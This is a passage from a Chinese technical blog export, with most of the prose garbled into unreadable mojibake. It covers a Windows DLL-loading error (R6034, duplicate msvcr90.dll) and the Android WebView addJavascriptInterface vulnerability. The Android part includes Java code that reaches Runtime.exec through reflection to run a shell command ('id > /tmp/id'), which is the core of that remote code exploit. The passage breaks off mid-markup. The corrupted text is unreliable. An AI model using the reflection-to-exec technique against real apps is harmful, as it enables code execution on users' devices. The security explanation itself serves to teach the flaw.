manifestã€‚ä»å¾®è½¯çš„è§£å†³åŠæ³•å¯ä»¥çŸ¥é“ï¼Œmanifestå¾ˆæœ‰å¯èƒ½åœ¨èµ„æºæ–‡ä»¶é‡Œã€‚</p><p>è¿˜æ˜¯å…ˆçœ‹çœ‹manifestçš„ä½œç”¨ï¼Œåœ¨msdnç½‘ç«™æœç´¢ç›¸å…³å†…å®¹ï¼Œæ ¹æ®ã€ŠUnderstanding Manifest Generation for C&#x2F;C++ Programsã€‹ä¸­çš„å†…å®¹ï¼Œmanfest.xmlå¯ä»¥æ˜¯ä¸€ä¸ªå¤–éƒ¨çš„XMLæ–‡ä»¶ä¹Ÿå¯ä»¥æ˜¯åµŒå…¥åœ¨ç¨‹åºçš„èµ„æºæ–‡ä»¶ä¸­ã€‚manifest.xmlç”¨äºç®¡ç†ç¨‹åºåœ¨è¿è¡Œæ—¶éœ€è¦çš„å…±äº«ç¨‹åºé›†çš„åå­—å’Œç‰ˆæœ¬ã€‚å¦‚æœç¨‹åºåªä¾èµ– VisualC++ çš„ç¨‹åºé›†ï¼ˆCRTï¼ŒMFCï¼ŒATLç­‰ï¼‰ï¼Œmanifestä¼šè¢«é“¾æ¥å™¨è‡ªåŠ¨ç”Ÿæˆã€‚Manifestçš„SxsæŒ‡å®šäº†å…¶ä¾èµ–çš„æ¸…å•åç§°,ç‰ˆæœ¬,èµ„æº,å’Œå…¶ä»–ç»„ä»¶ã€‚Sxsæ˜¯Windows XPå¼•å…¥çš„æ–°æŠ€æœ¯ï¼Œvs 2005 å¼€å§‹ä½¿ç”¨ï¼Œå…¨åå«Side by Side assemblyï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†è§£å†³å…¼å®¹æ€§é—®é¢˜ï¼Œè¿™æ ·åŒä¸€ä¸ªç³»ç»Ÿå¯ä»¥å­˜åœ¨ä¸åŒç‰ˆæœ¬çš„åŒåæ–‡ä»¶è€Œäº’ç›¸ä¸å½±å“å„è‡ªçš„è¿è¡Œã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/sxs.png" alt="sxs"></p><p>ç°åœ¨éœ€è¦å®šä½gvim.exeåŠ è½½å“ªä¸ªDLLå¼•èµ·äº†R6034é”™è¯¯ï¼Œä½¿ç”¨Process Explorerå‘ç°æ˜¯åŠ è½½ycm_client_support.pydå¯¼è‡´ã€‚åˆ é™¤YouCompleteMeæ’ä»¶åé”™è¯¯æ¶ˆå¤±ã€‚</p><p>å…ˆçœ‹çœ‹ycm_client_support.pydæ˜¯å¦ä½¿ç”¨äº†manifest.xml, ä½¿ç”¨ç¥å™¨TC,  F3ä¸€ä¸‹ï¼Œå¯ä»¥æŸ¥çœ‹manifestçš„æƒ…å†µã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/manifest.png" alt="manifest.xml"></p><p>å‘ç°å…¶å®ycm_client_support.pydå·²ç»ä½¿ç”¨äº†manifestï¼Œä½†æ˜¯ä»ç„¶å‡ºç°R6034é”™è¯¯ã€‚ä¸Šç½‘æœç´¢äº†ä¸€ç•ªï¼ˆè§æ–‡æœ«çš„å‚è€ƒé“¾æ¥ï¼‰ï¼Œå‘ç°è¿™å°±æ˜¯éå¸¸è‘—åçš„DLL Helläº†ï¼Œç»´åŸºç™¾ç§‘ä¸­ä¸“é—¨è®°å½•äº†è¿™ä¸ªé—®é¢˜ã€‚ <a href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a></p><p>ä¸è®ºå¦‚ä½•åº”è¯¥å°±æ˜¯DLLåŠ è½½æ—¶å‡ºé”™äº†ï¼Œå¯ä»¥ä½¿ç”¨Process Explorer å·¥å…·æ¥æŸ¥çœ‹å‡ºé—®é¢˜çš„è¿›ç¨‹ï¼Œçœ‹çœ‹åœ¨è¿›ç¨‹ç©ºé—´å†…å…·ä½“æ˜¯ä»€ä¹ˆæƒ…å†µã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer.png" alt="p-e"></p><p>å“ˆå“ˆï¼Œå‘ç°äº†ä¸€äº›æƒ…å†µï¼Œmsvcr90.dllåœ¨gvimè¿›ç¨‹ç©ºé—´é‡Œæœ‰ä¸¤ä¸ªï¼å†çœ‹çœ‹è¿™ä¸¤ä¸ªDLLçš„ä½ç½®ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer1.png" alt="p-e1"></p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer2.png" alt="p-e2"></p><p>åˆ é™¤æ‰ä¸åœ¨C:\WINDOWS\WinSxS\ç›®å½•é‡Œçš„msvcr90.dllï¼Œé—®é¢˜å¾—ä»¥è§£å†³ã€‚ç”±äºè¿™ä¸ªé”™è¯¯æ˜¯å› ä¸ºåŠ è½½ycm_client_support.pydå¼•èµ·çš„ï¼Œå†çœ‹çœ‹ycm_client_support.pydçš„æƒ…å†µï¼Œæ‹¿å‡ºTCç›´æ¥F3ä¸€ä¸‹ï¼Œåˆå‘ç°äº†ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ã€‚ycm_client_support.pydåŠ è½½çš„æ˜¯cmakeç›®å½•ä¸‹çš„msvcr90.dll, æ­£å¸¸æƒ…å†µä¸‹å› è¯¥ä½¿ç”¨ C:\Windows\winsxs ç›®å½•ä¸‹çš„msvcr90.dll</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc1.png" alt="tc1"></p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc2.png" alt="tc2"></p><p>æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript">D:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Microsoft</span> Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\VC&gt;</span> set | findstr Path<br><br>Path=D:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Microsoft</span> Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\Common7\IDE;D:\Program</span> Files<span class="hljs-string">\M</span><br>icrosoft Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\VC\BIN;D:\Program</span> Files<span class="hljs-string">\Microsoft</span> Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\C</span><br>ommon7<span class="hljs-string">\Tools;c:\Windows\Microsoft.NET\Framework\v3.5;c:\Windows\Microsoft.NET\Fr</span><br>amework<span class="hljs-string">\v2.0.50727;D:\Program</span> Files<span class="hljs-string">\Microsoft</span> Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\VC\VCPackages;C:</span><br><span class="hljs-string">\Program</span> Files<span class="hljs-string">\\Microsoft</span> SDKs<span class="hljs-string">\Windows\v6.0A\bin;C:\Windows\system32;C:\Windows;</span><br>d:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\CMake</span> <span class="hljs-number">2.8</span><span class="hljs-string">\bin;d:\Program</span> Files<span class="hljs-string">\LLVM</span> <span class="hljs-number">3.4</span>.svn<span class="hljs-string">\bin;d:\Program</span> File<br>s<span class="hljs-string">\Git\cmd;d:\Python27;D:\Program</span> Files<span class="hljs-string">\IDM</span> Computer Solutions<span class="hljs-string">\UltraEdit\</span><br>PSModulePath=C:<span class="hljs-string">\Windows\system32\WindowsPowerShell\v1.0\Modules\</span><br></code></pre></td></tr></table></figure><p>å¼•é”™è¯¯çš„åŸå› æ˜¯Windowsç¨‹åºåŠ è½½DLLæ˜¯ä¼šå…ˆåŠ è½½PATHå˜é‡ä¸­çš„DLLæ–‡ä»¶ï¼Œåé¢ä¼šåŠ è½½manifestæŒ‡å®šçš„WinSxSç›®å½•çš„æ–‡ä»¶ï¼Œè¿™æ ·å°±åŠ è½½äº†ä¸¤æ¬¡ï¼Œå¼•èµ·äº†é”™è¯¯ã€‚</p><p>è¿™ä¸ªé—®é¢˜æ¶‰åŠ WindowsåŠ è½½DLLæ–‡ä»¶çš„é¡ºåºï¼ŒWindowså®šä½ DLLæ–‡ä»¶çš„é¡ºåºå’Œä¸€ä¸ªæ³¨å†Œè¡¨é”®å€¼ç›¸å…³ï¼Œè¿™ä¸ªé”®å€¼æ˜¯ï¼š</p><p><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code></p><p>SafeDllSearchModeçš„å€¼ä¸º1ï¼Œå¼€å¯SafeDllSearchModeï¼Œ<br>SafeDllSearchModeçš„å€¼ä¸º0ï¼Œç¦ç”¨SafeDllSearchModeã€‚</p><p>Windowsç³»ç»Ÿé»˜è®¤å¼€å¯SafeDllSearchMode ï¼ˆWindows XP SP2 åï¼‰ï¼ŒMSDNæ–‡ç« ã€ŠDynamic-Link Library Search Orderã€‹ä¸­æŒ‡å‡ºï¼Œåœ¨SafeDllSearchModeå¼€å¯çš„æƒ…å†µä¸‹ï¼ŒWindowså®šä½DLLæ–‡ä»¶çš„é¡ºåºä¸ºï¼š</p><ol><li>The directory from which the application loaded.</li><li>The system directory. ( GetSystemDirectory )</li><li>The 16-bit system directory.</li><li>The Windows directory. (GetWindowsDirectory )</li><li>The current directory.</li><li>The directories that are listed in the PATH environment variable.</li></ol><p>åœ¨SafeDllSearchModeå…³é—­çš„æƒ…å†µä¸‹ï¼ŒWindowså®šä½DLLæ–‡ä»¶çš„é¡ºåºä¸ºï¼š</p><ol><li>The directory from which the application loaded.</li><li>The current directory.</li><li>The system directory. (GetSystemDirectory )</li><li>The 16-bit system directory.</li><li>The Windows directory. ( GetWindowsDirectory)</li><li>The directories that are listed in the PATH environment variable.</li></ol><p>å¦å¤–ï¼Œã€ŠDynamic-Link Library Search Orderã€‹ä¸­æŒ‡å‡ºä½¿ç”¨manifestå¯ä»¥æŒ‡å®šåŠ è½½DLLçš„è·¯å¾„ï¼Œä½†å®é™…çš„æƒ…å†µæ˜¯æœ‰å¯èƒ½åŠ è½½å¤šä¸ªDLLå¯¼è‡´è¿›ç¨‹å´©æºƒã€‚</p><p>Desktop applications can control the location from which a DLL is loaded by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, the system searches for the DLL at load time as described in this section.</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p>[1]ã€ŠWindows via C&#x2F;C++ Fifth Editionã€‹<br>[2] Side-by-side Assemblies <a href="http://msdn.microsoft.com/en-us/library/aa376307.aspx">http://msdn.microsoft.com/en-us/library/aa376307.aspx</a><br>[3] DLL Hell <a href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a><br>[4] C Run-Time Error R6034 <a href="http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx">http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx</a><br>[5] Understanding Manifest Generation for C&#x2F;C++ Programs <a href="http://msdn.microsoft.com/en-us/library/ms235542.aspx">http://msdn.microsoft.com/en-us/library/ms235542.aspx</a><br>[6] Search Path Used by Windows to Locate a DLL <a href="http://msdn.microsoft.com/en-us/library/7d83bc18.aspx">http://msdn.microsoft.com/en-us/library/7d83bc18.aspx</a><br>[7] Dynamic-Link Library Search Order <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a><br>[8] <a href="https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master">https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master</a><br>[9] <a href="https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide">https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide</a><br>[10] <a href="http://www.davidlenihan.com/2007/07/winsxs.html">http://www.davidlenihan.com/2007/07/winsxs.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android WebView æ¼æ´</title>
    <link href="/cn/webview_java/"/>
    <url>/cn/webview_java/</url>
    
    <content type="html"><![CDATA[<h2 id="â˜†-æ¥è‡ª-developer-android-com-çš„ä¿¡æ¯"><a href="#â˜†-æ¥è‡ª-developer-android-com-çš„ä¿¡æ¯" class="headerlink" title="â˜† æ¥è‡ª developer.android.com çš„ä¿¡æ¯"></a>â˜† æ¥è‡ª developer.android.com çš„ä¿¡æ¯</h2><p>Android å®˜æ–¹ç½‘ç«™å¯¹addJavascriptInterfaceçš„ä»‹ç»å¦‚ä¸‹ï¼š</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">public</span> void addJavascriptInterface (<span class="hljs-type">Object</span> <span class="hljs-type">object</span>, <span class="hljs-type">String</span> name)  Added <span class="hljs-keyword">in</span> API level <span class="hljs-number">1</span><br><br>Injects the supplied Java <span class="hljs-type">object</span> <span class="hljs-keyword">into</span> this WebView. The <span class="hljs-type">object</span> <span class="hljs-built_in">is</span> injected <span class="hljs-keyword">into</span><br>the JavaScript context <span class="hljs-keyword">of</span> the main frame, <span class="hljs-keyword">using</span> the supplied name. This allows <br>the Java <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s methods to be accessed from JavaScript. For applications</span><br>targeted <span class="hljs-keyword">to</span> API level JELLY_BEAN_MR1 <span class="hljs-built_in">and</span> above, only <span class="hljs-keyword">public</span> methods that are <br>annotated <span class="hljs-keyword">with</span> JavascriptInterface can be accessed <span class="hljs-keyword">from</span> JavaScript. <span class="hljs-keyword">For</span> applications<br>targeted <span class="hljs-keyword">to</span> API level JELLY_BEAN <span class="hljs-built_in">or</span> below, all <span class="hljs-keyword">public</span> methods (including the inherited ones)<br>can be accessed, see the important security note below <span class="hljs-keyword">for</span> implications.<br><br>Note that injected objects will <span class="hljs-built_in">not</span> appear <span class="hljs-keyword">in</span> JavaScript <span class="hljs-keyword">until</span> the page <span class="hljs-built_in">is</span> <span class="hljs-keyword">next</span><br>(re)loaded. <span class="hljs-keyword">For</span> example:<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JsObject</span> &#123;<br>   <span class="hljs-meta">@JavascriptInterface</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;injectedObject&quot;</span>; &#125;<br>&#125;<br><br>webView.addJavascriptInterface(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JsObject</span>(), <span class="hljs-string">&quot;injectedObject&quot;</span>);<br>webView.loadData(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;text/html&quot;</span>, <span class="hljs-literal">null</span>);<br>webView.loadUrl(<span class="hljs-string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">This method can be used <span class="hljs-keyword">to</span> allow JavaScript <span class="hljs-keyword">to</span> control the host application. <br>This <span class="hljs-built_in">is</span> a powerful feature, but also presents a security risk <span class="hljs-keyword">for</span> apps targeting<br>JELLY_BEAN <span class="hljs-built_in">or</span> earlier. Apps that target a version later than JELLY_BEAN are still<br>vulnerable <span class="hljs-keyword">if</span> the app runs <span class="hljs-keyword">on</span> a device running Android earlier than <span class="hljs-number">4.2</span>. The <br>most secure way <span class="hljs-keyword">to</span> use this method <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span> target JELLY_BEAN_MR1 <span class="hljs-built_in">and</span> <span class="hljs-keyword">to</span> ensure the<br>method <span class="hljs-built_in">is</span> called only <span class="hljs-keyword">when</span> running <span class="hljs-keyword">on</span> Android <span class="hljs-number">4.2</span> <span class="hljs-built_in">or</span> later. <span class="hljs-keyword">With</span> these older <br>versions, JavaScript could use reflection <span class="hljs-keyword">to</span> access an injected <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s public</span><br>fields. Use <span class="hljs-keyword">of</span> this method <span class="hljs-keyword">in</span> a WebView containing untrusted content could allow<br>an attacker <span class="hljs-keyword">to</span> manipulate the host application <span class="hljs-keyword">in</span> unintended ways, executing <br>Java code <span class="hljs-keyword">with</span> the permissions <span class="hljs-keyword">of</span> the host application. Use extreme care <span class="hljs-keyword">when</span> <br><span class="hljs-keyword">using</span> this method <span class="hljs-keyword">in</span> a WebView which could contain untrusted content.<br>JavaScript interacts <span class="hljs-keyword">with</span> Java <span class="hljs-type">object</span> <span class="hljs-keyword">on</span> a <span class="hljs-keyword">private</span>, background thread <span class="hljs-keyword">of</span> this <br>WebView. Care <span class="hljs-built_in">is</span> therefore required <span class="hljs-keyword">to</span> maintain thread safety.<br><br>The Java <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s fields are not accessible.</span><br><span class="hljs-keyword">For</span> applications targeted <span class="hljs-keyword">to</span> API level LOLLIPOP <span class="hljs-built_in">and</span> above, methods <span class="hljs-keyword">of</span> injected <br>Java objects are enumerable <span class="hljs-keyword">from</span> JavaScript. Parameters <span class="hljs-type">object</span> the Java <span class="hljs-type">object</span> <br><span class="hljs-keyword">to</span> inject <span class="hljs-keyword">into</span> this WebView<span class="hljs-comment">&#x27;s JavaScript context. Null values are ignored.</span><br>name  the name used <span class="hljs-keyword">to</span> expose the <span class="hljs-type">object</span> <span class="hljs-keyword">in</span> JavaScript<br></code></pre></td></tr></table></figure><p>  ä¹‹æ‰€ä»¥æä¾›addJavascriptInterfaceæ˜¯ä¸ºäº†WebViewä¸­çš„Javascriptå¯ä»¥å’Œæœ¬åœ°çš„App<br>  é€šè®¯ï¼Œè¿™ç¡®å®æ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œè¿™ä¹ˆåšçš„å¥½å¤„åœ¨äºæœ¬åœ°Appé€»è¾‘ä¸å˜çš„æƒ…å†µä¸‹ï¼Œä¸<br>  éœ€è¦å‡çº§Appå°±å¯ä»¥å¯¹ç¨‹åºè¿›è¡Œæ›´æ–°ï¼Œä¿®æ”¹ç›¸åº”çš„Webé¡µé¢å°±å¯ä»¥äº†ã€‚</p><h2 id="â˜†-ç›¸å…³çŸ¥è¯†"><a href="#â˜†-ç›¸å…³çŸ¥è¯†" class="headerlink" title="â˜† ç›¸å…³çŸ¥è¯†"></a>â˜† ç›¸å…³çŸ¥è¯†</h2><h3 id="WebViewçš„ä½¿ç”¨æ–¹æ³•"><a href="#WebViewçš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="WebViewçš„ä½¿ç”¨æ–¹æ³•"></a>WebViewçš„ä½¿ç”¨æ–¹æ³•</h3><p>  åœ¨layoutä¸­å®šä¹‰ <webview>, åœ¨Activityçš„onCreateä¸­åŠ å…¥ä¸‹é¢çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebView</span> <span class="hljs-variable">webview</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebView</span>(<span class="hljs-built_in">this</span>);<br>setContentView(webview);<br>webview.loadUrl(<span class="hljs-string">&quot;http://slashdot.org/&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3><p>  åå°„æ˜¯javaè¯­è¨€æä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œä½¿Javaç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶æ£€æŸ¥ç±»ã€æ¥å£ã€æ–¹æ³•å’Œæˆå‘˜ï¼Œ<br>è€Œä¸éœ€è¦åœ¨ç¼–è¯‘çš„æ—¶å€™çŸ¥é“ç±»çš„åå­—å’Œæ–¹æ³•ç­‰ç»†èŠ‚ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> Reflect;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a1</span><span class="hljs-params">()</span> &#123;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a2</span><span class="hljs-params">()</span> &#123;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">hello</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    Demo demo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">mObjectClass</span> <span class="hljs-operator">=</span> demo.getClass();<br><br>    System.out.println(mObjectClass.getName());<br><br>    Method[] methods = mObjectClass.getMethods();<br>    <span class="hljs-keyword">for</span>(Method method : methods)&#123;<br>        System.out.println(<span class="hljs-string">&quot;method = &quot;</span> + method.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> mObjectClass.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> m.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> obj.getClass();<br>        String[] array = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;id &gt; /tmp/id&quot;</span>&#125;;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> c2.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, array.getClass());<br>        n.invoke(obj, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;array&#125;);<br><br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>        System.out.println(e.toString());<br>    &#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&gt; javac -d . Reflect/hello.java<br>&gt; java Reflect.hello<br><br>Reflect.Demo<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> a2<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> a1<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> wait<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> equals<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> toString<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> hashCode<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> getClass<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> notify<br><span class="hljs-attribute">method</span> <span class="hljs-operator">=</span> notifyAll<br></code></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚</p><h3 id="é€šè¿‡reflection-è®¿é—®private"><a href="#é€šè¿‡reflection-è®¿é—®private" class="headerlink" title="é€šè¿‡reflection è®¿é—®private"></a>é€šè¿‡reflection è®¿é—®private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> Reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a1</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;I am a1&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a2</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;I am a2&quot;</span>);<br>&#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">hello</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    Demo demo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">mObjectClass</span> <span class="hljs-operator">=</span> demo.getClass();<br><br>    System.out.println(mObjectClass.getName());<br><br>    Method[] methods = mObjectClass.getDeclaredMethods();<br>    <span class="hljs-keyword">for</span>(Method method : methods)&#123;<br>        System.out.println(<span class="hljs-string">&quot;method = &quot;</span> + method.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> mObjectClass.newInstance();<br>        methods[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);<br>        methods[<span class="hljs-number">0</span>].invoke(o);<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>    &#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight 